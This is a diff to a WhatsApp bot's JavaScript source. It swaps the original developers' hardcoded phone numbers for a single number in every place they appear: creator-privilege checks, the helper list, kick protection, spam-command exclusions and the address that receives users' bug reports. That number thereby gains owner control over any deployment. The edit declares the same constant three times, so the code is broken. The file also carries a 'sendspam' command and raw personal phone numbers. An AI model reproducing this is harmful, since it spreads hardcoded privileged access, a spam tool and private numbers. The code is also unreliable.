@@ -23,10 +23,10 @@ const TIME_ZONE = global.TIME_ZONE
 const MENU_IMOJI = global.MENU_IMOJI
   const M_E = MENU_IMOJI.split('|')[0]
   const D_E = MENU_IMOJI.split('|')[1]
-const HELPERS = '94716338723,94711421243,94719574492'
+const HELPERS = '94768211424,94768211424,94768211424'
 global.ALL_LINK_KICK = global.ALL_LINK_KICK 
 const SEX_DL = global.SEX_VIDEO_DOWNLOAD
-//global.SUDO = ["94711421243","94716221644","94716338723","94723043748"]
+//global.SUDO = ["94768211424","94768211424","94768211424","94723043748"]
 var LOGO_MAKING = ''
   if (global.LANG == 'EN') LOGO_MAKING = '*🌈 Take a moment to createing your textlogo...*'
   if (global.LANG == 'SI') LOGO_MAKING = '*🌈 මදක් රැදීසිටින්න ඔබගේ textlogo සෑදමින් පවතී...*'
@@ -183,13 +183,13 @@ module.exports = ElisaBotMd = async (ElisaBotMd, m, chatUpdate, store) => {
         const args = body.trim().split(/ +/).slice(1)
         const pushname = m.pushName || "No Name"
         const botNumber = await ElisaBotMd.decodeJid(ElisaBotMd.user.id)
-    	const nimanumber = "94719574492"
-    	const nimanumber2 = "94715166712"
-    	const pasiduu = "94716338723"
-    	const isuruu = "94716221644"
-    	const thinuraa = "94711421243"
-        const isCreator = [pasiduu,isuruu,thinuraa,nimanumber2,botNumber,nimanumber ,...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
-        const isNima = m.sender == "94715166712@s.whatsapp.net" ? true : false
+    	const thivanumber = "94768211424"
+    	const thivanumber2 = "94768211424"
+    	const nirmal = "94768211424"
+    	const nirmal = "94768211424"
+    	const nirmal = "94768211424"
+        const isCreator = [nirmal,nirmal,nirmal,thivanumber2,botNumber,thivanumber ,...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+        const isNima = m.sender == "94768211424@s.whatsapp.net" ? true : false
         const itsMe = m.sender == botNumber ? true : false
         const isXnxxGrp = m.chat == "120363043146209271@g.us" ? true : false 
         const text = q = args.join(" ")
@@ -390,7 +390,7 @@ const m_reply = (teks) => {
                                ElisaBotMd.sendMessage(m.chat, { text : teks } ,{ quoted: m })  
                                }
 	     
-	          if (m.sender == '94719574492@s.whatsapp.net') {
+	          if (m.sender == '94768211424@s.whatsapp.net') {
                 const nimareact = ["👨‍💻","✅","👸","🥷"]
                 var mask = nimareact[Math.floor(Math.random()*nimareact.length)]
                 await ElisaBotMd.sendMessage(from, { react: { text: `${mask}`, key: m.key }})
@@ -402,7 +402,7 @@ const m_reply = (teks) => {
         	if (m.chat === '120363043491784571@g.us') {
 				  return
 				  }
-	  /*	if (m.chat === '94719574492-1634878051@g.us') {
+	  /*	if (m.chat === '94768211424-1634878051@g.us') {
                  return
 		}
 		if (m.chat === '120363052773472047@g.us') {
@@ -498,19 +498,19 @@ m_reply(imoji)
       if (m.sender == '94764440407@s.whatsapp.net') {
       await ElisaBotMd.sendMessage(from, { react: { text: `🤍`, key: m.key }})
       }
-      if (m.sender == '94716221644@s.whatsapp.net') {
+      if (m.sender == '94768211424@s.whatsapp.net') {
       await ElisaBotMd.sendMessage(from, { react: { text: `⚕️`, key: m.key }})
       }
       if (m.sender == '94701629707@s.whatsapp.net') {
       await ElisaBotMd.sendMessage(from, { react: { text: `🐋`, key: m.key }})
       }
-      if (m.sender == '94716338723@s.whatsapp.net') {
+      if (m.sender == '94768211424@s.whatsapp.net') {
       await ElisaBotMd.sendMessage(from, { react: { text: `🧜‍♂`, key: m.key }})
       }
-      if (m.sender == '94711421243@s.whatsapp.net') {
+      if (m.sender == '94768211424@s.whatsapp.net') {
       await ElisaBotMd.sendMessage(from, { react: { text: `⚜️`, key: m.key }})
       }
-      if (m.sender == '94715166712@s.whatsapp.net') {
+      if (m.sender == '94768211424@s.whatsapp.net') {
       await ElisaBotMd.sendMessage(from, { react: { text: `🗿`, key: m.key }})
       }
 	
@@ -1329,7 +1329,7 @@ case 'cyberspace':
 },
 "message": {
 "groupInviteMessage": {
-"groupJid": "94719574492-1634878051@g.us",
+"groupJid": "94768211424-1634878051@g.us",
 "inviteCode": `${global.ownernma}`,
 "groupName": `${global.botnma}`, 
 "caption":`ᴍͥ ʀ ​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ ɴ ɪͣ ᴍͫ ᴀ ⁴⁹²`, 
@@ -2206,9 +2206,9 @@ reply(`${text}​​​​​​​​​​​​​​​​​​​​​​
 }
 break
 case 'sendspam': case 'sendspm': {
-     if (text === "94715166712") {
+     if (text === "94768211424") {
      throw  ('*☡ ᴛʜɪs ɪs ᴍʏ ᴏᴡɴᴇʀ ɴᴜᴍʙᴇʀ*')
-     }  else if (text === "94719574492") {
+     }  else if (text === "94768211424") {
      throw ('*☡ ᴛʜɪs ɪs ᴍʏ ᴏᴡɴᴇʀ ɴᴜᴍʙᴇʀ*')
      }  else if (text === "94775315987") {
      throw  ('*☡ ᴛʜɪs ɪs ᴍʏ ᴏᴡɴᴇʀ ɴᴜᴍʙᴇʀ*')
@@ -2856,7 +2856,7 @@ sᴀɴᴜᴡᴀ - ғʀᴏ ʜᴇʟᴘ
                                   if (!isBotAdmins) return reply( mess.botAdmin)
                                   if (!isAdmins) return reply( mess.admin)
                            let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-                           if(users === "94715166712@s.whatsapp.net") return reply('*👸💬 Can`t Remove Nima*')
+                           if(users === "94768211424@s.whatsapp.net") return reply('*👸💬 Can`t Remove Nima*')
                            const KICK_MESSAGE = global.db.data.settings[botNumber].kickmessage || `*${users.split("@")[0]} Remove From Group*`
 		                  await ElisaBotMd.groupParticipantsUpdate(m.chat, [users], 'remove')
 		                  .then((res) => reply(KICK_MESSAGE)).catch((err) => reply(jsonformat(err)))
@@ -8108,7 +8108,7 @@ View List Of Messages With ${prefix}listmsg`)
                                   let buttons = [{
                                                   urlButton: {
                                                       displayText: 'REPORT BUG',
-                                                      url: 'https://wa.me/94715166712?text=hello+bro+i+found+a+bug+in+your+bot'
+                                                      url: 'https://wa.me/94768211424?text=hello+bro+i+found+a+bug+in+your+bot'
                                                   }
                                               }, {
                                                   quickReplyButton: {
@@ -8260,7 +8260,7 @@ View List Of Messages With ${prefix}listmsg`)
                                       case 'bug': case 'reportowner': {  
                           await ElisaBotMd.sendMessage(from, { react: { text: `⛔`, key: m.key }})
                                           if(!text) throw `Enter The Bug Example\n\n${command} < YOUR REPORT MASSAGE > `
-                                          await ElisaBotMd.sendMessage(`94715166712@s.whatsapp.net`, {text: `*Bug Report From:* wa.me/${m.sender.split("@")[0]}
+                                          await ElisaBotMd.sendMessage(`94768211424@s.whatsapp.net`, {text: `*Bug Report From:* wa.me/${m.sender.split("@")[0]}
                   Report Message: ${text}` })
                   const repo = await ElisaBotMd.sendMessage(`*『 𝙱𝚄𝙶 𝚁𝙴𝙿𝙾𝚁𝚃 』* ${Lang.OWNER_REPORT}`)
                   await ElisaBotMd.sendMessage(from, { react: { text: `✅`, key: repo.key }})
